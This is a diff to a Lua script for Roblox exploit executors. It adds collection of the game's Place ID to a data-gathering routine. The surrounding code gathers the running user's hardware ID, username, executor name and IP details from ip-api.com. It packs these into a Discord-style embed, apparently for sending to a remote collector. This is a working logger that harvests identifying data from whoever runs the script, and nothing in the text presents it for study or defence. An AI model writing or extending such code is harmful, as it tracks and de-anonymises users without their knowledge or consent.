@@ -33,10 +33,16 @@ local function getUsername()
     return game:GetService("Players").LocalPlayer.Name
 end
 
+-- Fetch the Location ID (Place ID) of the game
+local function getLocationID()
+    return game.PlaceId  -- This returns the Place ID of the current game session
+end
+
 local hwid = getHWID()
 local date, time = getDateTime()
 local username = getUsername()
 local executor = detectExecutor()
+local locationID = getLocationID()  -- Get the current game location ID
 
 local ip_info = http_request({
     Url = "http://ip-api.com/json",
@@ -69,7 +75,8 @@ local data = {
                 {["name"] = "Date", ["value"] = date, ["inline"] = true},
                 {["name"] = "Time", ["value"] = time, ["inline"] = true},
                 {["name"] = "HWID", ["value"] = hwid, ["inline"] = false},
-                {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
+                {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
+                {["name"] = "PlaceID", ["value"] = tostring(locationID), ["inline"] = true},  -- Added location ID
                 {["name"] = "IP Information", ["value"] = ip_data, ["inline"] = false},
             },
             ["color"] = 16711680
